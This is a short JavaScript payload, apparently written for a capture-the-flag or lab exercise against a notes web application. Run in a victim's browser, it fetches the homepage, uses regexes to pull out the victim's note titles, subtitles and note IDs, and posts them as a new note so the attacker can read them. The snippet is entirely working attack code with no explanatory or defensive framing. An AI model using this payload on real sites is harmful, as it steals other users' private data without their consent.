fetch('/').then(function(r){ return r.text(); }).then(function(html){
  // Get everything between <ul class="list"> and </ul>
  var listMatch = html.match(/<ul class="list">([\s\S]*?)<\/ul>/);
  var listContent = listMatch ? listMatch[1] : 'NO_LIST_FOUND';
  
  // Get all note IDs and titles
  var notePattern = /<li>[\s\S]*?<strong>(.*?)<\/strong>[\s\S]*?<span class="subtle">(.*?)<\/span>[\s\S]*?\/note\/([a-f0-9]+)/g;
  var notes = [];
  var match;
  while ((match = notePattern.exec(html)) !== null) {
    notes.push(match[1] + '|' + match[2] + '|' + match[3]);
  }
  
  // Also get simple note IDs
  var noteIds = html.match(/\/note\/[a-f0-9]+/g) || [];
  
  fetch('/note/new', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'title=HOMEPAGE&body=' + encodeURIComponent(
      'NOTE_DETAILS:\n' + notes.join('\n') + 
      '\n\nALL_IDS:\n' + noteIds.join('\n') +
      '\n\nRAW_LIST:\n' + listContent.substring(0, 2000)
    )
  });
});
